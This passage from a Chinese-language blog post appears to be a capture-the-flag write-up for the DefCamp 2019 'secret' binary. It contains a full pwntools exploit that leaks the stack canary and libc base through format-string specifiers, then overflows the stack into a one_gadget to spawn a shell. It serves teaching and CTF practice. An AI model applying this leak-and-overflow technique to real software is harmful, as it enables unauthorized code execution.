<p><img src="/img/Format_string_attack/defcamp2019_secret_8.png" alt=""></p>
<p>我們挑最後一個來看</p>
<p><img src="/img/Format_string_attack/defcamp2019_secret_9.png" alt=""></p>
<p>可以看到裡面的記憶體區段屬於libc的區段，所以我們只要把這個位址扣掉 235</p>
<p><img src="/img/Format_string_attack/defcamp2019_secret_10.png" alt=""></p>
<p>就會得到 <code>__libc_start_main</code> 的開頭位址, 在有libc版本的情況下就可以取得libc_base</p>
<p>進一步可以透過one_gadget然後用overflow取得shell</p>
<p>exploit:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.arch = &apos;amd64&apos;</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">context.terminal = &apos;bash&apos;</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">def leak_offset(payload):</span><br><span class="line">    io = process(&quot;./pwn_secret&quot;)</span><br><span class="line">    io.recvuntil(&quot;Name: &quot;)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    io.recvuntil(&quot;Hillo &quot;)</span><br><span class="line">    info = io.recv()</span><br><span class="line">    io.close()</span><br><span class="line">    return info</span><br><span class="line"></span><br><span class="line">autofmt = FmtStr(leak_offset)</span><br><span class="line">print autofmt.offset</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">leak_offset = 6</span><br><span class="line">canary_offset = 15</span><br><span class="line">overflow_offset = 0x90-0x8</span><br><span class="line">binELF = ELF(&quot;./secret&quot;)</span><br><span class="line">libcELF = ELF(&quot;./libc-2.29.so&quot;)</span><br><span class="line"></span><br><span class="line">read_got = binELF.got[&apos;read&apos;]</span><br><span class="line">printf_got = binELF.got[&apos;printf&apos;]</span><br><span class="line">libc_start_main_libc = libcELF.symbols[&apos;__libc_start_main&apos;]</span><br><span class="line">leak = &quot;%15$lx&quot; + &quot; &quot; + &quot;%16$lx&quot; + &quot; &quot; + &quot;%17$lx&quot;</span><br><span class="line"></span><br><span class="line">#leak = &quot;|%17$lx|%18$lx|%19$lx|%20$lx|%21$lx&quot;</span><br><span class="line">#leak = &quot;%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|&quot;</span><br><span class="line">io = process(&quot;secret&quot;)</span><br><span class="line">io.recvuntil(&quot;Name: &quot;)</span><br><span class="line">#gdb.attach(io)</span><br><span class="line">io.sendline(leak)</span><br><span class="line">raw = io.recvline().split(&quot; &quot;)</span><br><span class="line">canary = int(raw[1], 16)</span><br><span class="line">program_base = int(raw[2], 16) - 0xc40</span><br><span class="line">#use gdb to trace in you will find main&apos;s return address is &lt;libc_start_main + 235&gt;</span><br><span class="line">libc_start_main = int(raw[3], 16) - 235</span><br><span class="line">libc_base = libc_start_main - libc_start_main_libc</span><br><span class="line">log.info(&quot;canary is %x&quot; %canary)</span><br><span class="line">log.info(&quot;program_base is %x&quot; %program_base)</span><br><span class="line">log.info(&quot;libc_start_main is %x&quot; %libc_start_main)</span><br><span class="line">log.info(&quot;libc base is %x&quot; %libc_base)</span><br><span class="line"></span><br><span class="line">one = libc_base + 0xe664b</span><br><span class="line"></span><br><span class="line">overflow = &quot;a&quot;*overflow_offset + p64(canary) + &apos;bbbbbbbb&apos;  +p64(one)</span><br><span class="line">print(repr(p64(canary)))</span><br><span class="line"></span><br><span class="line">io.recvuntil(&quot;ase: &quot;)</span><br><span class="line">io.sendline(overflow)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></p>
<p>喔還有一點，因為程式有 call <code>alarm</code>，太惱人了，所以我有把他patch成 <code>isnan</code></p>
<p><img src="/img/Format_string_attack/defcamp2019_secret_11.png" alt=""></p>


                
            </div>

            <!-- Comments -->
            
                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                    


                </div>
            
        </div>
    </div>
</article>

    <!-- Footer -->
    <hr />

<!-- Footer -->
<footer>
    <div class="container">
        <div class="row">
            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                <ul class="list-inline text-center">
                    

                    

                    
                        <li>
                            <a href="https://github.com/sda06407" target="_blank">
                                <span class="fa-stack fa-lg">
                                    <i class="fa fa-circle fa-stack-2x"></i>
                                    <i class="fa fa-github fa-stack-1x fa-inverse"></i>
                                </span>
                            </a>
                        </li>
                    

                    

                    

                    
                </ul>
                <p class="copyright text-muted">&copy; 2020 AStar<br></p>
                <p class="copyright text-muted">Original Theme <a target="_blank" href="http://startbootstrap.com/template-overviews/clean-blog/">Clean Blog</a> from <a href="http://startbootstrap.com/" target="_blank">Start Bootstrap</a></p>
                <p class="copyright text-muted">Adapted for <a target="_blank" href="https://hexo.io/">Hexo</a> by <a href="http://www.codeblocq.com/" target="_blank">Jonathan Klughertz</a></p>
            </div>
        </div>
    </div>
</footer>


    <!-- After footer scripts -->
    
<!-- jQuery -->
<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>

<!-- Bootstrap -->
<script src="//maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>

<!-- Gallery -->
<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>

<!-- Disqus Comments -->



</body>

</html>